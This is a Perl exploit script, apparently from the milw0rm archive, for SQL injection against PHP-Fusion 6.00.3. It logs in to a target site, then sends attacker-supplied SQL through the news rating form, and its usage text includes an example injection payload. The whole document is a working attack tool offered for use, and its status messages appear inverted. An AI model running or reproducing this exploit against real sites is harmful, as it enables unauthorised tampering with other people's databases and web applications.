#!/usr/bin/perl
#Exploit for PHP-Fusion 6.00.3 Released
#Coded by:krasza[krasza@gmail.com]
#Greetz: http://www.curityreason.com
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;
if(!$ARGV[3]){
print<<EOF;
Exploit for PHP-Fusion 6.00.3 Released
Coded by krasza
Contact me:krasza\@gmail.com
Greets:
-http://www.ecurityreason.com
-http://www.revival.pl
-mulander

Usage:
perl phpfusion.pl url login pass sql
url-url hack site with [php fusion's directory]
login-your login
pass-your password
sql-[sql code]
Example:
\t perl phpfusion.pl http://www.something.com/php-fusion admin password 3','31337','HACKED')/*
EOF
exit;
}
my $url=shift;
my $login=shift;
my $haslo=shift;
my $sql=shift;
$url=$url."/news.php?readmore=1";
my $ua = new LWP::UserAgent;
$ua->agent("Exploit for PHP-Fusion" . $ua->agent);
$ua->cookie_jar( HTTP::Cookies->new(
'file' => 'ciasteczka.txt',
'autosave' => 1,));
print "[+]Connecting to $url...\n";

my $zadanie = new HTTP::Request POST => $url;
$zadanie->content_type('application/x-www-form-urlencoded');
$zadanie->content('user_name=' . $login . '&user_pass=' . $haslo . '&login=Loguj'
);
my $wynik = $ua->request($zadanie);
if ($wynik->is_success){
print "[+]Connected to $url\n";
#LOGIN JEST PRAWIDLOWE
}else{
print "[-]Connected failed to $url\n";
print "[-]Error:".$wynik->message."\n";
exit;
}
print "[+] Logging In $url...\n";
$zadanie = new HTTP::Request POST => $url;
$zadanie->content_type('application/x-www-form-urlencoded');
$zadanie->content('rating='.$sql.'&post_rating=Dodaj+ocen%EA');
my $wynik2 = $ua->request($zadanie);
if ($wynik2->is_success){
print "[+] Sql query isn't done!\n";
}else{
print "[-]Sql query is done\n";
}

# milw0rm.com [2005-12-23]
